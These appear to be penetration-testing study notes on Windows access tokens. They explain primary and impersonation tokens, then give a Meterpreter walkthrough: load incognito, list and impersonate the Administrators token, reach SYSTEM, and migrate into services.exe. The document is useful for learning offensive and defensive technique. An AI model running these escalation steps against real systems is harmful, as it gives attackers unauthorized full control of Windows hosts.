https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens <- **Check.**
https://www.exploit-db.com/papers/42556 <-**Check.**

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

Access token consists of:
   - user SIDs(security identifier)
   - group SIDs
   - privileges
  
  
Two types of access tokens:
   - primary access tokens: those associated with a user account that are generated on log on
   - impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
 						- SecurityAnonymous: current user/client cannot impersonate another user/client
 						- SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
 						- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
 						- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

VICTIM:
```powershell
C:\> whoami/priv
		SeDebugPrivilege                Debug programs                            Enabled		<- Exploitable
		SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
		SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
		SeImpersonatePrivilege          Impersonate a client after authentication Enabled 		<- Exploitable
```

ATTACKER:
```bash
$ CTRL + Z

$ meterpreter > load incognito

$ list_tokens -g 
	BUILTIN\Administrators		<- Exploitable
	BUILTIN\IIS_IUSRS

$ meterpreter > impersonate_token "BUILTIN\Administrators"

$ getuid
	Server username: NT AUTHORITY\SYSTEM

$ ps
	 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
	 
$ migrate 668(PID)

---CHANGE TO SHELL AND CHECK WHOAMI--
```